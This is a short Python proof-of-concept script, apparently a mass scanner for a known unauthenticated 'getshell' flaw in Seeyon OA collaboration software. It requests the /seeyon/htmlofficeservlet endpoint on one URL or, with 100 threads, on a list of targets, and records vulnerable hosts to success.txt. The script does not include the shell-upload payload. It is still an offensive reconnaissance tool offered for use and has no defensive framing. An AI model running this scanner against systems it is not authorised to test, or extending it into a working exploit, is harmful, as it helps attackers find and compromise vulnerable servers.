import requests, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = ("""                                                   
    <<<<<<致远 OA 协同管理软件无需登录getshell>>>>>>
""")
    print(test)


def poc(target):
    payload = "/seeyon/htmlofficeservlet"

    try:
        res1 = requests.get(url=target+payload, verify=False)
        if res1.status_code == 200 and 'operate' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('success.txt', 'a', encoding='utf-8') as f:
                f.write(f'{target}存在漏洞\n')
        else:
            print(f"该{target}不存在")
    except Exception as e:
        print(e)



def main():
    banner()

    parser = argparse.ArgumentParser(description='致远 OA 协同管理软件无需登录getshell')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h获取帮助信息")


if __name__ == '__main__':
    main()
